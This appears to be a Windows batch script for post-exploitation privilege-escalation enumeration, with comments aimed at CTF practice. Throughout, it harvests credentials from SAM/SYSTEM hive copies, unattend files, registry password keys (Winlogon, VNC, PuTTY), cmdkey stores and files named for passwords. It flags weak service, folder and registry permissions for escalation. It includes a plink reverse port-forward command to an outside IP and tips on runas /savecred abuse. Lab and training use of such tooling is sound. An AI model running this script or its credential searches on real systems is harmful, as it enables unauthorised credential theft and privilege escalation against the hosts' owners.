@echo off
set userprofile=%cd%
mode con:cols=160 lines=9999 
Cd c:\ > New_result.txt

echo ------ System Info (Use full output in conjunction with windows-exploit-suggester.py)------- >> New_result.txt
systeminfo >> New_result.txt
echo. >> New_result.txt

echo ----- Architecture ------- >> New_result.txt
SET Processor >> New_result.txt
echo. >> New_result.txt

echo ------ Users and groups (check individual user with 'net user USERNAME' ) Check user privileges for SeImpersonate (rotten potato exploit) ------- >> New_result.txt
:: Note, in CTF boxes its not uncommon to see other low level users on the machine. It can be a temptation to want to always skip to Administrator, but sometimes it is essential that you elevate privileges to that of a different user first before being able to get admin rights. Once you get that users rights, pay close attention to their user folder.
echo Current User: %username% >> New_result.txt 
whoami /all >> New_result.txt
echo --- All users, accounts and groups --- >> New_result.txt
net users >> New_result.txt
net accounts >> New_result.txt
net localgroup >> New_result.txt

echo ------- Administrators -------- >> New_result.txt
net localgroup administrators >> New_result.txt

echo ------- Environment Variables ------- >> New_result.txt
set >> New_result.txt
echo. >> New_result.txt

echo ------- Additional Drives (if not run as part of a batch job replace double percent with single percent sign)-------- >> New_result.txt
for %%i in (a b d e f g h i j k l m n o p q r s t u v w x y z) do @dir %%i: 2>nul >> New_result.txt
echo. >> New_result.txt

echo ---------------------------------------- Search for Quick Wins -------------------------------------- >> New_result.txt
echo -------- Listing contents of user directories --------- >> New_result.txt
:: In CTF machines it is VERY common for there to be artifacts used for privilege escalation within user directories. Pay special attention for files that may contain credentials, or files that maybe used as part of a scheduled task. You can typically ignore most default windows files (some of which have been filtered out as part of this script).
dir "C:\Users\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\" >> New_result.txt
dir "C:\Documents and Settings\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\" >> New_result.txt
echo. >> New_result.txt

echo -------- Exploring program directories and C:\ ---------
:: These directory listings are not recursive. They are meant to give you a general overview of the programs installed on the system. Searchsploit every (non default/windows) program version, and check each program config for creds. 
echo --- Program Files --- >> New_result.txt
dir "C:\Program Files" /b >> New_result.txt
echo --- Program Files (x86) --- >> New_result.txt
dir "C:\Program Files (x86)" /b >> New_result.txt
echo --- Root of C:\ ---- >> New_result.txt
dir "C:\" /b >> New_result.txt
echo. >> New_result.txt

echo --- Inetpub (any config files in here? May need to manually drill into this folder if it exists) --- >> New_result.txt
:: The root web folder can at times be extensive, and thus we do not always want to show a recursive listing of its contents in this script but it should always be investigated regardless.
dir /a /b C:\inetpub\ >> New_result.txt

echo --- Broad search for Apache or Xampp --- >> New_result.txt
dir /s /b apache* xampp* >> New_result.txt
echo. >> New_result.txt

echo ---Search for Configuration and sensitive files--- >> New_result.txt
echo -- Broad search for config files -- >> New_result.txt
:: If the .NET framework is installed you will get a bunch of config files which are typically default and can be ignored. The more you practice priv esc. the more youll learn which files can be ignored, and which you should give a closer eye to.
dir /s /b php.ini httpd.conf httpd-xampp.conf my.ini my.cnf web.config >> New_result.txt
echo -- Application Host File -- >> New_result.txt
type C:\Windows\System32\inetsrv\config\applicationHost.config 2>nul >> New_result.txt
echo -- Broad search for unattend or sysprep files -- >> New_result.txt
dir /b /s unattended.xml* sysprep.xml* sysprep.inf* unattend.xml* >> New_result.txt
echo -- Stored Passwords -- >> New_result.txt
:: To use stored cmdkey credentials use runas with /savecred flag (e.g. runas /savecred /user:ACCESS\Administrator "ping 10.10.10.9")
cmdkey /list >> New_result.txt
echo. >> New_result.txt

echo -- Checking for any accessible SAM or SYSTEM files -- >> New_result.txt
dir %SYSTEMROOT%\repair\SAM 2>nul >> New_result.txt
dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul >> New_result.txt
dir %SYSTEMROOT%\System32\config\SAM 2>nul >> New_result.txt
dir %SYSTEMROOT%\repair\system 2>nul >> New_result.txt
dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul >> New_result.txt
dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul >> New_result.txt
dir /a /b /s SAM.b* >> New_result.txt
echo. >> New_result.txt

echo -- Broad search for vnc kdbx or rdp files -- >> New_result.txt
dir /a /s /b *.kdbx *vnc.ini *.rdp >> New_result.txt
echo. >> New_result.txt

echo --- Searching Registry for Passwords --- >> New_result.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" >> New_result.txt
reg query HKLM /f password /t REG_SZ /s /k >> New_result.txt
reg query HKCU /f password /t REG_SZ /s /k >> New_result.txt
reg query "HKCU\Software\ORL\WinVNC3\Password" >> New_result.txt
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> New_result.txt
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> New_result.txt
echo. >> New_result.txt

echo --- AlwaysInstallElevated Check ---  >> New_result.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> New_result.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> New_result.txt
echo. >> New_result.txt

echo --- Program Files and User Directories where everybody (or users) have full or modify permissions ---  >> New_result.txt
where /q icacls
IF ERRORLEVEL 1 (
    echo icacls is missing, performing checks using cacls for older versions of Windows
    FOR /F "tokens=* USEBACKQ" %%F IN (`where cacls`) DO (SET cacls_exe=%%F)
) ELSE (
    FOR /F "tokens=* USEBACKQ" %%F IN (`where icacls`) DO (SET cacls_exe=%%F)
)
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone" >> New_result.txt
%cacls_exe% "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" >> New_result.txt
%cacls_exe% "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" >> New_result.txt
echo. >> New_result.txt

echo ---Domain joined? If so check domain controller for GPP files ---- >> New_result.txt
set user >> New_result.txt
echo. >> New_result.txt

cd %userprofile%
echo ---Unquoted Service Paths (requires that the directory from which this script is run is user writeable. If it is not, you can use the WMIC command below) --- >> New_result.txt
REM wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """ >> New_result.txt 
sc query state= all > scoutput.txt
findstr "SERVICE_NAME:" scoutput.txt > Servicenames.txt
FOR /F "tokens=2 delims= " %%i in (Servicenames.txt) DO @echo %%i >> services.txt
FOR /F %%i in (services.txt) DO @sc qc %%i | findstr "BINARY_PATH_NAME" >> path.txt
find /v """" path.txt > unquotedpaths.txt
sort unquotedpaths.txt|findstr /i /v C:\WINDOWS >> New_result.txt
del /f Servicenames.txt
del /f services.txt
del /f path.txt
del /f scoutput.txt
del /f unquotedpaths.txt
echo. >> New_result.txt

echo --------------- AccessChk (checks permissions for Authenticated Users, Everyone, and Users)------------------ >> New_result.txt
reg.exe ADD "HKCU\Software\Sysinternals\AccessChk" /v EulaAccepted /t REG_DWORD /d 1 /f

echo --- Accesschk World writeable folders and files ---- >> New_result.txt
accesschk.exe -uwdqs "Users" c:\ /accepteula >> New_result.txt
accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula >> New_result.txt
accesschk.exe -qwsu "Everyone" * /accepteula >> New_result.txt
accesschk.exe -qwsu "Authenticated Users" * /accepteula >> New_result.txt
accesschk.exe -qwsu "Users" * /accepteula >> New_result.txt
echo.  >> New_result.txt
echo  --- Accesschk services with weak permissions ---  >> New_result.txt
accesschk.exe -uwcqv "Authenticated Users" * /accepteula >> New_result.txt
accesschk.exe -uwcqv "Everyone" * /accepteula >> New_result.txt
accesschk.exe -uwcqv "Users" * /accepteula >> New_result.txt
echo.  >> New_result.txt
echo  --- Accesschk services that we can change registry values for (such as ImagePath) ---  >> New_result.txt
accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula >> New_result.txt
accesschk.exe -kvqwsu "Authenticated Users" hklm\system\currentcontrolset\services /accepteula >> New_result.txt
accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula >> New_result.txt
echo. >> New_result.txt

echo ---------------------------------------- End Search for Quick Wins -------------------------------------- >> New_result.txt

cd c:\
echo ------- Powershell existence/version check ------- >> New_result.txt
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion  >> New_result.txt

echo ------- Network shares ------- >> New_result.txt
net share >> New_result.txt

echo ------- Programs that run at startup ------ >> New_result.txt
:: Note on some legacy Windows editions WMIC may fail to install/start/freeze in which case you'll need to comment out any calls to wmic
wmic startup get caption,command >> New_result.txt

echo -------- Path (is dll hijacking possible?) ------ >> New_result.txt
echo Getting system + user path from command line (check permissions using cacls [path] or accesschk.exe -dqv [path])... >> New_result.txt
echo %path% >> New_result.txt
echo. >> New_result.txt
:: I couldnt find a way to only get system path in DOS (user path does not matter for the purpose of dll hijacking). If powershell is available you can use folderperm.ps1 script
:: https://github.com/ankh2054/windows-pentest/blob/master/Powershell/folderperms.ps1
:: powershell.exe -ExecutionPolicy Bypass -noLogo -Command "[Environment]::GetEnvironmentVariable('Path', [System.EnvironmentVariableTarget]::Machine)"
:: Or let the script do all the work for you
:: powershell.exe -executionpolicy bypass -file folderperm.ps1

echo ------- Scheduled Tasks Names Only ------- >> New_result.txt
:: Look for any interesting/non-standard scheduled tasks, then view the scheduled task details list below to get a better idea of what that task is doing and who is running it). 
schtasks /query /fo LIST 2>nul | findstr "TaskName" >> New_result.txt
echo. >> New_result.txt

echo ------- Scheduled Tasks Details (taskname, author, command run, run as user) ------- >> New_result.txt
schtasks /query /fo LIST /v | findstr "TaskName Author: Run: User:" >> New_result.txt
echo. >> New_result.txt

echo ------- Services Currently Running (check for Windows Defender or Anti-virus)  --------- >> New_result.txt
net start >> New_result.txt
echo. >> New_result.txt

echo ------- Link Running Processes to started services -------- >> New_result.txt
tasklist /SVC >> New_result.txt
echo. >> New_result.txt

echo ------- Processes verbose output (who is running what?) -------- >> New_result.txt
:: Pay close attention to this list. Especially for those tasks run by a user other than your own. 
tasklist /v >> New_result.txt
echo. >> New_result.txt

echo ------- Patches (also listed as part of systeminfo) ------- >> New_result.txt
:: Note on some legacy Windows editions WMIC may fail to install/start/freeze in which case you'll need to comment out any calls to wmic
:: Systeminfo may at times fail to list all patches (instead showing 'file x' or something along those lines) in which case its important to have this fallback.
wmic qfe get Caption,Description,HotFixID,InstalledOn  >> New_result.txt

echo ------- Firewall ------ >> New_result.txt
netsh firewall show state  >> New_result.txt
netsh firewall show config  >> New_result.txt
netsh advfirewall firewall dump >> New_result.txt

echo ------ Network information ------ >> New_result.txt
ipconfig /all >> New_result.txt

:: Routing and ARP tables accessible with these commands... uncomment if you wish, I didnt typically find them helpful for priv esc.
REM route print
REM arp -A
echo. >> New_result.txt

echo ------- Current connections and listening ports ------- >> New_result.txt
:: Reverse port forward anything that is not accessible remotely, and run nmap on it. If SMB is available locally, do you have creds or hashes you can pass through it after port forwarding?
netstat -ano  >> New_result.txt
echo. >> New_result.txt
echo ------- REVERSE PORT FORWARD MULTIPLE PORTS AT ONCE: plink.exe -l username -pw mysecretpassword -P [port] 10.11.0.108 -R 8080:127.0.0.1:8080 -R 8000:127.0.0.1:8000 -R 443:127.0.0.1:443 ------------ >> New_result.txt
echo. >> New_result.txt

echo --- Broad search for any possible config files which may contain passwords --- >> New_result.txt
:: The following broad config file and credential searches could result in many results. They are meant as a fall back once you have already done thorough enumeration of user directories, web directories, and program directories (in addition to having pillaged the db). 
dir /s /b *pass* *cred* *vnc* *.config* >> New_result.txt
echo. >> New_result.txt

echo --- Starting broad search in the background for any files with the word password in it. Press enter to get status occasionally --" >> New_result.txt
start /b findstr /sim password *.xml *.ini *.txt *.config *.bak 2>nul >> New_result.txt
echo. >> New_result.txt
